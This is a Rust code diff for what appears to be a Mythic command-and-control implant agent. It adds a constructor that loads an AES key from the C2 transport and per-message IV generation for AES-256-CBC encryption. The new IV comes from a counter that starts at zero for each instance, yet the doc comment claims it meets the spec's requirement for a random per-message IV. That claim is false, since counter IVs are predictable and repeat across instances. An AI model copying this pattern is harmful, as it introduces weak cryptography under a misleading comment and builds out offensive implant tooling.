@@ -2,14 +2,16 @@ use alloc::{
     string::String,
     vec::Vec,
 };
+use core::cell::Cell;
 use uuid::Uuid;
 
 use crate::c2::{C2Transport, MythicError};
 use crate::protocol::{
-    Aes256HmacCrypto, CheckinInfo, MythicMessageError, ReqCheckin, ReqGetTasking,
+    crypto::AES256_IV_LEN, Aes256HmacCrypto, CheckinInfo, MythicMessageError, ReqCheckin,
+    ReqGetTasking,
     ReqPostResponse, ReqStagingRSA, ReqStagingTranslation, RespCheckin, RespGetTasking,
-    RespPostResponse, RespStagingRSA, RespStagingTranslation, TaskResponse, encode_message,
-    encode_message_plain, decode_message, decode_message_plain,
+    RespPostResponse, RespStagingRSA, RespStagingTranslation, TaskResponse, decode_message,
+    decode_message_plain, encode_message, encode_message_plain,
 };
 
 /// High-level facade for building and parsing Mythic protocol messages.
@@ -18,6 +20,10 @@ use crate::protocol::{
 /// depending on the phase) and optional AES crypto keys.  Every `build_*` /
 /// `parse_*` method automatically picks the right wire encoding (plain or
 /// AES-256-CBC-HMAC encrypted) based on whether crypto keys are set.
+///
+/// When encryption is active a fresh IV is generated per message via an
+/// internal counter — unique per message, matching the Mythic spec's
+/// requirement for a per-message random IV.
 ///
 /// # UUID lifecycle
 ///
@@ -34,29 +40,33 @@ use crate::protocol::{
 pub struct Mythic {
     agent_uuid: Uuid,
     crypto: Option<Aes256HmacCrypto>,
+    iv_counter: Cell<u64>,
 }
 
 impl Mythic {
     // ── Constructors ──────────────────────────────────
 
-    /// Create a new instance without crypto — all messages will be plaintext.
+    /// Plaintext mode — no encryption (`crypto_type = "none"`).
     pub fn new(agent_uuid: Uuid) -> Self {
-        Self {
-            agent_uuid,
-            crypto: None,
-        }
+        Self { agent_uuid, crypto: None, iv_counter: Cell::new(0) }
     }
 
-    /// Create a new instance with a pre-shared AES key — all messages will be
-    /// AES-256-CBC-HMAC encrypted.
-    ///
-    /// For static-key payloads this is the final key.  For RSA-staging
-    /// payloads this is the initial AESPSK embedded at build time.
+    /// Encrypted mode — the pre-shared AES key (static key) or initial
+    /// AESPSK for staging.
     pub fn with_crypto(agent_uuid: Uuid, crypto: Aes256HmacCrypto) -> Self {
-        Self {
-            agent_uuid,
-            crypto: Some(crypto),
-        }
+        Self { agent_uuid, crypto: Some(crypto), iv_counter: Cell::new(0) }
+    }
+
+    /// Build a `Mythic` instance by reading the C2's own crypto configuration.
+    ///
+    /// Reads [`C2Transport::aes_psk`] (base64 key) and constructs an
+    /// [`Aes256HmacCrypto`].  If the C2 provides no key, the instance is
+    /// plaintext.
+    pub fn from_c2(agent_uuid: Uuid, c2: &impl C2Transport) -> Self {
+        let crypto = c2
+            .aes_psk()
+            .and_then(|b64| Aes256HmacCrypto::from_base64_key(&b64).ok());
+        Self { agent_uuid, crypto, iv_counter: Cell::new(0) }
     }
 
     // ── State ─────────────────────────────────────────
@@ -274,12 +284,20 @@ impl Mythic {
 
     // ── Internals ─────────────────────────────────────
 
+    fn next_iv(&self) -> [u8; AES256_IV_LEN] {
+        let n = self.iv_counter.get();
+        self.iv_counter.set(n.wrapping_add(1));
+        let mut iv = [0u8; AES256_IV_LEN];
+        iv[..8].copy_from_slice(&n.to_le_bytes());
+        iv
+    }
+
     fn encode<T: serde::Serialize>(
         &self,
         msg: &T,
     ) -> Result<String, MythicMessageError> {
         match &self.crypto {
-            Some(c) => encode_message(msg, self.agent_uuid, c),
+            Some(c) => encode_message(msg, self.agent_uuid, c, &self.next_iv()),
             None => encode_message_plain(msg, self.agent_uuid),
         }
     }
